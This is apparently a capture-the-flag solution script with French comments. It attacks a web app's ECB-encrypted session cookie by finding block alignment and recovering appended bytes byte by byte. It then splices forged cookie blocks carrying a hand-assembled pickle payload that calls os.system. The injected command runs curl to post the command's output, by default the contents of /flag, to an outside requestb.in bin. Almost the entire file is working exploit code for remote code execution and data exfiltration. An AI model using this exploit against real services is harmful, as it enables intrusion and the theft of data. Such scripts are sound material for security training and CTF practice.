#!/usr/bin/env python3
import argparse
import json
import logging
import random
import requests
import struct


# Init logging
logging.basicConfig(format='[%(asctime)s] %(message)s', level=logging.DEBUG)
logging.getLogger('requests').setLevel(logging.WARNING)
log = logging.getLogger(__name__)


# Helper pour utiliser requestb.in
class Requestbin:
    def __init__(self):
        r = requests.post('http://requestb.in/api/v1/bins', data={
            'private': 'true'
        })
        for key, val in json.loads(r.text).items():
            setattr(self, key, val)

    def requests(self):
        r = requests.get('http://requestb.in/api/v1/bins/%s/requests' % self.name)
        return json.loads(r.text)


def encrypt(username, host, port):
    # ajout d'un préfixe aléatoire de taille fixe
    # pour que chaque username soit unique
    prefix = bytes([random.randint(0x20, 0x7e) for _ in range(4)])

    data = {
        'username': prefix + username,
        'password': 'X' * 8,
        'password-confirm': 'X' * 8
    }
    r = requests.post('http://%s:%d/register' % (host, port), data=data)
    return r.cookies['session']


def decrypt(cookie, host, port):
    requests.get('http://%s:%d/' % (host, port), cookies={'session': cookie})


def split_fix_length(buf, n):
    return [buf[i:i + n] for i in range(0, len(buf), n)]


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Script de solution')
    parser.add_argument('host', metavar='HOST', type=str,
                        help='Hostname')
    parser.add_argument('port', metavar='PORT', type=int,
                        help='Port')
    parser.add_argument('--cmd', type=str, default='cat /flag',
                        help='Commande à injecter (default: cat /flag)')
    parser.add_argument('--full', action='store_true', default=False,
                        help='Lancer tous les tests')
    args = parser.parse_args()

    host, port = args.host, args.port

    log.info("Trouver la longueur de l'username donnant 2 fois le même bloc")
    length = 1
    while True:
        blocks = split_fix_length(encrypt(b'A' * length, host, port), 32)
        if len(blocks) > 3 and blocks[2] == blocks[3]:
            break
        length += 1

    log.info("Longueur de %d", length + 4)

    # on sait donc que cette longueur - 32 commence un nouveau bloc (le 3-ième)
    length -= 2 * 16

    if args.full:
        log.info("Trouver ce que le serveur ajoute après l'username")
        append = b''

        while len(append) < 16:
            blocks = split_fix_length(encrypt(b'A' * (length + 16 - len(append) - 1), host, port), 32)
            needed_block = blocks[2]
            for c in range(256):
                blocks = split_fix_length(encrypt(b'A' * (length + 16 - len(append) - 1) + append + bytes([c]), host, port), 32)
                if needed_block == blocks[2]:
                    append += bytes([c])
                    break
            log.debug('Found %r', append)

        log.info("Ajouté après l'username: %r", append)

    # payload
    log.info("Injection du payload")

    # le challenge ici est d'utiliser uniquement de l'ASCII
    # ce qui est au final simple avec pickle (voir /usr/lib/python3.5/pickle.py)
    requestbin = Requestbin()
    cmd = 'curl -X POST -d "$(%s)" http://requestb.in/%s' % (args.cmd, requestbin.name)
    cmd = cmd.encode('utf8')

    inject = b'cposix\nsystem\n' # push os.system (load_global)
    inject += b'(' # push mark (load_mark)
    inject += b'X' + struct.pack('<I', len(cmd)) + cmd # push cmd (load_binunicode)
    inject += b't' # stack[k:] = [tuple(stack[k+1:])] (load_tuple)
    inject += b'R' # stack[-2](stack[-1]) (load_reduce)
    inject += b'\x00' * ((16 - len(inject) % 16) % 16)

    blocks = split_fix_length(encrypt(b'A' * length + inject, host, port), 32)
    payload = ''.join(blocks[2:2 + len(inject) // 16])

    # bim!
    decrypt(payload, host, port)

    for request in requestbin.requests():
        log.info('Result: %s', request['raw'])
